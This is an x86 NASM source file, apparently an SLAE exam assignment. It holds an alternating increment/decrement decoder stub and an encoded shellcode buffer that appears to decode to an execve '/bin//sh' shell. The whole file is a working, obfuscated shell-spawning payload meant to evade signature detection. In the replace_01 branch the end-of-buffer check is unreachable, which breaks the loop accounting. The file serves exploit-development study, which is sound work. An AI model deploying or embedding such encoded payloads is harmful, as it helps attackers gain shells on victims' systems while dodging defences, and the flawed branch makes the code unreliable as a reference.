; Filename: incdecDecoder.nasm
; Author:   Muhereza Herbert
; Website:  http://kilobytesecurity.com
;
; Purpose: SLAE Exam requirement Assignment Four


global _start			

section .text
_start:

	jmp call_decoder

	decoder:
		pop esi
		xor ecx, ecx					;initialize counter
		inc cl							;cl = 1
        mov al, slen

	decode:
		cmp cl, 1
		jg INC 
		cmp byte [esi], 187
		je replace_ff
		dec BYTE [esi]
		inc cl			        		;cl = 2

		;Have we reached end of shellcode
		dec al
    	jz Shellcode		    		;Decoding is done, jump to shellcode
				
		inc esi							;Go to next byte in shellcode
		jmp short decode				;Loop back to decode

		replace_ff:
			mov byte [esi], 255	
			inc cl						;cl = 2

			;Have we reached end of shellcode
			dec al
    		jz Shellcode		    	;Decoding is done, jump to shellcode

			inc esi						;Go to next byte in shellcode
			jmp short decode			;Loop back to decode

		INC:
			cmp byte [esi], 255
		    je replace_01
    		inc byte [esi]
			dec cl						;cl = 1

			;Have we reached end of shellcode
			dec al
	    	jz Shellcode		    	;Decoding is done, jump to shellcode

			inc esi						;Go to next byte in shellcode
			jmp short decode			;Loop back to decode

			replace_01:
				mov byte [esi], 1	
				dec cl					;cl = 1
				inc esi					;Go to next byte in shellcode
				jmp short decode		;Loop back to decode

				;Have we reached end of shellcode
				dec al
	    	jz Shellcode		    	;Decoding is done, jump to shellcode

section .data
			
	call_decoder:
		call decoder
		Shellcode: db 0x32,0xbf,0x51,0x67,0x30,0x2e,0x74,0x67,0x69,0x2e,0x63,0x68,0x6f,0x88,0xe4,0x4f,0x8a,0xe1,0x54,0x88,0xe2,0xaf,0x0c,0xcc,0x81	
		slen equ $-Shellcode
